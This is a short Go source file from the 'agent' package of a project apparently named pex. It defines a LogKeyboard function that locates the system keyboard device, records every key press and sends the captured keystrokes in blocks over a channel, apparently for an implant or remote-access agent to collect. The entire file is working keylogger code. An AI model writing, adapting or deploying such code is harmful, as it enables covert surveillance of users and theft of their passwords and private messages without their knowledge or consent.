package agent

import (
	"log/slog"

	"github.com/MarinX/keylogger"
	"github.com/hardal7/pex/internal/config"
)

func LogKeyboard(ch chan string) {
	keyboard := keylogger.FindKeyboardDevice()
	if len(keyboard) == 0 {
		ch <- "No keyboard found"

		return
	}
	keylog, _ := keylogger.New(keyboard)

	var keysPressed string
	events := keylog.Read()
	for event := range events {
		if event.Type == keylogger.EvKey {
			if event.KeyPress() {
				slog.Info("Key pressed: " + event.KeyString())
				keysPressed += event.KeyString()
				if len(keysPressed) > config.KeyLogBlockSize {
					ch <- keysPressed
					keysPressed = ""
				}
			}
		}
	}
	defer keylog.Close()
}
